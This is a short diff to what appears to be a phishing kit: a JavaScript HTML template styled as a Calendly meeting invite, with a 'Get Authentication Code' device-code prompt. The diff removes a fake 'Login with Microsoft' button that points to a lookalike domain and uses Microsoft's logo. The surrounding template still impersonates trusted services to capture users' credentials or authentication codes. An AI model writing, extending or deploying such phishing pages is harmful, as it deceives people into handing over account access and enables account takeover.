@@ -1913,13 +1913,6 @@ const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
                             </div>
                             
                             <button class="btn-continue" onclick="openOtpDialog()">Get Authentication Code</button>
-                            
-                            <div class="divider-row">OR</div>
-                            
-                          <button class="btn-oauth oauth-btn" onclick="window.location.href='https://calendly.masonparkes-new-meeting-invite.invoicetrack.work/L6Cif722Dy/n/9q3GeyuEaCKL7y8wZp3nlZQEXNukGH'">
-                              <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
-                              Login with Microsoft
-                          </button>
                         </div>
                     </div>
                 </div>
